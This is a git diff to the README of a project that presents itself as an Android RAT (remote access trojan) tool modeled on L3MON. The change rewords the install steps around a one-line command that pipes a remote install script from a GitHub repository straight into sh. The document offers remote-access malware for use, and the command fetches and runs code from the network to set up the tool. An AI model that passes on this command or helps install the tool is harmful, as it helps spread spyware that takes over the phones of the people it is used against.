@@ -19,7 +19,9 @@ This is a Android RAT tool inspired from L3MON. I Developed This tool to add som
 ```bash
 . Install Termux
 . apt update && apt upgrade    #optional step as script will do this.
-. copy and paste the below command
+```
+# After copy and paste the below command and Grab a Coffee. (:
+```bash
 curl -s https://raw.githubusercontent.com/Bhartiya-Hacker/Liz-RAT/master/install.sh | sh
 ```
 
